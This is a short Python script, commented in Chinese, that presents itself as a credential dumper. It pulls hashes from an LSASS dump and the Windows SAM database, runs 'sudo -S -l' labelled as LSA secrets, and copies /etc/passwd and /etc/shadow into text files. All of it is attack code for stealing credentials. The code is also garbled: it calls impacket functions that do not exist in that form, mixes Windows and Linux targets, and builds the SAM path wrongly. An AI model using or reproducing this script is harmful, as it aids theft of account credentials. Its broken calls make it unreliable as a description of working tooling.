from impacket import secretsdump
import os
import subprocess

def dump_credentials():
    # 讀取LSASS凭据
    lsass_path = '/opt/lsass/lsass.dmp'
    lsass_credentials = secretsdump.lsadump.get_credentials(lsass_path)
    # 讀取SAM数据库
    sam_path = os.path.join('C:', 'Windows', 'System32', 'config', 'SAM')
    sam_credentials = secretsdump.samdump.get_credentials(sam_path)
    # 讀取LSA secrets
    lsa_secrets = subprocess.check_output('sudo -S -l', shell=True)
    # 讀取/etc/passwd和/etc/shadow
    passwd_path = '/etc/passwd'
    shadow_path = '/etc/shadow'

    # 寫入檔案
    with open('lsass_credentials.txt', 'w') as f:
        for cred in lsass_credentials:
            f.write(cred + '\n')

    with open('sam_credentials.txt', 'w') as f:
        for cred in sam_credentials:
            f.write(cred + '\n')

    with open('lsa_secrets.txt', 'w') as f:
        f.write(lsa_secrets.decode())

    with open('passwd.txt', 'w') as f:
        with open(passwd_path, 'r') as passwd:
            f.write(passwd.read())

    with open('shadow.txt', 'w') as f:
        with open(shadow_path, 'r') as shadow:
            f.write(shadow.read())

# 呼叫函式
dump_credentials()